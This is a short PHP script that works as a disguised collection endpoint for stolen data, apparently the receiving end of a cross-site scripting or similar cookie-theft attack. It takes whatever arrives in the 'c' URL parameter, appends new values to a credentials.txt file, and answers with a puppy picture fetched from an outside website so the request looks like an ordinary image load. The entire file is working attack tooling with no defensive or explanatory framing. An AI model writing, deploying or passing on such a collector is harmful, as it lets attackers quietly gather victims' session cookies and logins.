<?php
    if (! exec('grep '.escapeshellarg($_GET['c']).' ./credentials.txt') ) {
        $result = file_put_contents('credentials.txt', $_GET['c']."\n", FILE_APPEND);
    }
    header('Content-Type: image/jpeg');
    readfile('http://cuteanimalpicturesandvideos.com/wp-content/uploads/super-cute-puppy-look-awww-photo.jpg');
    exit;
?>
